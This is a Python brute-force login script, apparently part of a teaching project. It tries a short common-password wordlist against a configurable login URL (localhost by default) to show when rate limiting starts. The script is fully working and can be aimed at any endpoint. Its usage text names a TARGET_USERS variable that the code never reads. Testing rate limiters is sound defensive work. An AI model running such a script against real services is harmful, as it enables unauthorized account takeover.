"""
Login Brute-Force Script
========================
Sends sequential POST /auth/login requests to measure at what attempt count
the rate limiter kicks in. Demonstrates credential stuffing / brute force and
the difference between vulnerable mode (unlimited) and secured mode (429 after 5).

Usage:
    TARGET_URL=http://localhost:8000 python offensive/brute_force.py
    TARGET_USERS=admin,user1 python offensive/brute_force.py
"""
import asyncio
import os
import time

import httpx
from rich.console import Console
from rich.panel import Panel
from rich.progress import BarColumn, Progress, TextColumn, TimeElapsedColumn
from rich.table import Table

console = Console()
BASE_URL = os.getenv("TARGET_URL", "http://localhost:8000")
TARGET_USERNAME = os.getenv("TARGET_USER", "user1")
MAX_ATTEMPTS = int(os.getenv("MAX_ATTEMPTS", "20"))

WORDLIST = [
    "password", "123456", "qwerty", "letmein", "admin", "welcome",
    "monkey", "dragon", "master", "sunshine", "princess", "football",
    "shadow", "superman", "michael", "abc123", "password1", "password2",
    "iloveyou", "1234567",
]


async def brute_force():
    console.print(Panel.fit(
        f"[bold red]Login Brute-Force Simulator[/]\n"
        f"Target: {BASE_URL}/auth/login\n"
        f"Username: {TARGET_USERNAME}\n"
        f"Wordlist: {len(WORDLIST)} passwords",
        title="[red]OFFENSIVE TOOL — EDUCATIONAL USE ONLY[/]"
    ))

    summary = []
    rate_limited_at: int | None = None
    success_at: int | None = None
    start_time = time.time()

    async with httpx.AsyncClient() as client:
        with Progress(
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("{task.completed}/{task.total}"),
            TimeElapsedColumn(),
            console=console,
        ) as progress:
            task = progress.add_task("Brute forcing...", total=len(WORDLIST))

            for attempt, password in enumerate(WORDLIST, start=1):
                resp = await client.post(
                    f"{BASE_URL}/auth/login",
                    json={"username": TARGET_USERNAME, "password": password},
                    timeout=5.0,
                )
                elapsed = round(time.time() - start_time, 2)
                summary.append({
                    "attempt": attempt,
                    "password": password,
                    "status": resp.status_code,
                    "elapsed_s": elapsed,
                })

                if resp.status_code == 200:
                    success_at = attempt
                    progress.stop()
                    console.print(
                        f"\n[bold green][!] SUCCESS at attempt #{attempt}![/]\n"
                        f"    Password: [bold]{password}[/]\n"
                        f"    Token: {resp.json().get('access_token', '')[:40]}..."
                    )
                    break

                if resp.status_code == 429:
                    rate_limited_at = attempt
                    retry_after = resp.headers.get("Retry-After", "?")
                    progress.stop()
                    console.print(
                        f"\n[bold yellow][!] RATE LIMITED at attempt #{attempt}[/]\n"
                        f"    Retry-After: {retry_after}s\n"
                        f"    Time to rate limit: {elapsed:.2f}s\n"
                        f"    X-RateLimit-Limit: {resp.headers.get('X-RateLimit-Limit', '?')}"
                    )
                    break

                progress.advance(task)

    elapsed_total = round(time.time() - start_time, 2)

    # Results table
    table = Table(title="Brute Force Summary", show_lines=True)
    table.add_column("Attempt", style="cyan", justify="right")
    table.add_column("Password", style="yellow")
    table.add_column("HTTP Status", justify="center")
    table.add_column("Elapsed (s)", justify="right")

    for row in summary:
        status = str(row["status"])
        color = "green" if row["status"] == 200 else "yellow" if row["status"] == 429 else "dim"
        table.add_row(str(row["attempt"]), row["password"], f"[{color}]{status}[/]", str(row["elapsed_s"]))

    console.print(table)
    console.print(f"\n[bold]Total time: {elapsed_total}s[/]")

    if rate_limited_at:
        console.print(f"[green]✓ Rate limiting engaged after {rate_limited_at} attempts[/]")
    elif success_at:
        console.print(f"[red]✗ Password found at attempt #{success_at} — no rate limiting blocked it[/]")
    else:
        console.print(f"[red]✗ Completed {len(WORDLIST)} attempts with NO rate limiting[/]")


if __name__ == "__main__":
    asyncio.run(brute_force())
